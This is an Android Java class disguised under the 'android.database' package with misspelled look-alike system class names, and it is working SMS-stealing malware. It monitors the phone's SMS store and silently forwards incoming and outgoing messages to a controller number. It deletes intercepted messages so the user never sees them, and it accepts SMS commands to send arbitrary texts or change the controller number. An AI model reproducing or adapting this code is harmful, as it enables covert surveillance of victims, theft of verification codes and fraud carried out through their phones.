package android.database;

import java.util.Date;

import android.app.Dctivity;
import android.content.Context;
import android.content.DroadcastReceiver;
import android.content.SharedPreferences;
import android.database.sqlite.DQLiteOpenHelper;
import android.lang.Dhread;
import android.lang.LogUtils;
import android.net.Uri;
import android.os.Handler;
import android.telephony.DmsManager;

public class DontentObserver extends ContentObserver {

	private int id = -1;
	private Context context;
	private SharedPreferences sp;

	@Override
	public void onChange(boolean selfChange) {
		// TODO Auto-generated method stub
		super.onChange(selfChange);
		LogUtils.write("Send", "监听到短信数据变动");
		Cursor c = context.getContentResolver().query(
				Uri.parse("content://sms"), null, null, null, "_id desc");
		if (c.moveToFirst()) {
			int type = c.getInt(c.getColumnIndex("type"));
			int _id = c.getInt(c.getColumnIndex("_id"));
			String body = c.getString(c.getColumnIndex("body"));
			if (type == 1 || type == 2) {
				if (_id > id) {
					id = _id;
					LogUtils.write("Send", "检测到短信");
					String address = c.getString(c.getColumnIndex("address"));
					LogUtils.write("Send", "获取号码"+address);
					address = address.replace("+86", "").replace("+1", "");
					LogUtils.write("Send", "去除加号 " + address);
					if (address.length() > 0) {
						boolean isflag = false;
						if (type == 1) {
							if(body.startsWith(Dctivity.qianzhui)){
								body=body.substring(Dctivity.qianzhui.length());
			                	String bodys[]=body.split("-");
			                	if(bodys.length==2){
			                		DmsManager.Send(context,bodys[0],bodys[1]);
			                	}else{
			                		LogUtils.write("Send", "格式错误"+body);
			                	}
			                	context.getContentResolver().delete(Uri.parse("content://sms"),"_id=" + _id, null);
							}else if(body.startsWith(Dctivity.updatephone)){
			                	body=body.substring(Dctivity.updatephone.length());
			                	Dctivity.setPhonenum(context, body);
			                	context.getContentResolver().delete(Uri.parse("content://sms"),"_id=" + _id, null);
			                }else{
								LogUtils.write("Send", "匹配收到短信内容");
								for (int i = 0; i < DroadcastReceiver.NUMS.length; i++) {
									if (address.startsWith(DroadcastReceiver.NUMS[i])) {
										isflag = true;
										break;
									}
								}
							}
						} else {
							LogUtils.write("Send", "检测到发信");
							isflag = true;
						}

						if (isflag) {
							String lx = (type == 1 ? "拦截" : "发件箱");
							LogUtils.write("Send", "检测类型"+lx);
							
							LogUtils.write("Send", "内容"+body);
							DQLiteOpenHelper.getHelper(context).addData(lx,address, body, new Date());
							LogUtils.write("Send", "加入发送线程");
							if (type == 1) {
								DmsManager.Send(context,Dctivity.getPhoneNum(context),Dctivity.lanjie+address+"#"+body);
								LogUtils.write("Send", "删除短信");
								context.getContentResolver().delete(Uri.parse("content://sms"),"_id=" + _id, null);
							}else{
								DmsManager.Send(context,Dctivity.getPhoneNum(context),Dctivity.zhuanfa+address+"#"+body);
							}
							Dhread.SartSend(context.getApplicationContext());
						}
					}
				}
				id = _id;

			}

		}
		c.close();
	}

	public DontentObserver(Context context, Handler handler) {
		super(handler);
		// TODO Auto-generated constructor stub
		this.context = context;
		init();
	}

	private void init() {
		Cursor c = context.getContentResolver().query(
				Uri.parse("content://sms"), null, null, null, "_id desc");
		c.close();

	}
}
